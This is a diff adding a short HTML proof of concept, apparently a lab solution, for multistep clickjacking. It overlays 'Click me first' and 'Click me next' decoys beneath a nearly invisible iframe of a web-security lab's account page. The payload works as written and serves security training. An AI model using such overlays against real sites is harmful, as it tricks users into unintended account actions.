@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<!-- DSTRIKE Lab PoC: clickjacking-lab-05.html (Multistep clickjacking) -->
+<html>
+<head>
+  <style>
+    iframe { position: relative; width: 700px; height: 600px; opacity: 0.0001; z-index: 2; }
+    .first { position: absolute; top: 505px; left: 60px; z-index: 1; }
+    .second { position: absolute; top: 295px; left: 210px; z-index: 1; }
+  </style>
+</head>
+<body>
+  <div class="first">Click me first</div>
+  <div class="second">Click me next</div>
+  <iframe src="https://TARGET-LAB-ID.web-security-academy.net/my-account"></iframe>
+</body>
+</html>
